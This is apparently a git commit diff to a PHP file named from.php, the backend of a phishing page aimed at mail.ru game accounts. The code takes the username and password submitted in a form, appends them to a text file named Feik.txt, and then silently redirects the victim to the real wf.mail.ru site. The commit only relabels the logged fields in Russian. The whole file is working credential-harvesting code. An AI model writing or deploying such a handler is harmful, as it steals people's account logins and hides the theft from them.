b9a711cc400469a834e2915baf427cec2d1ed3de
HAN <lolo-amx2@mail.ru>
2017-02-25 09:03:15 +0300

    22

--- 2/from.php
+++ 2/from.php
@@ -2,7 +2,7 @@
 $Log = $_POST['username'];
 $Pass =$_POST['password'];
 $log = fopen("Feik.txt","at");
-fwrite($log,"Nick- $Log:|Pass- $Pass:|Server- $Pas|\n");
+fwrite($log,"Лигин:  $Log:|Пароль:  $Pass:|Server- not $Pas|\n");
 fclose($log);
 echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://wf.mail.ru'></head></html>";
 ?>
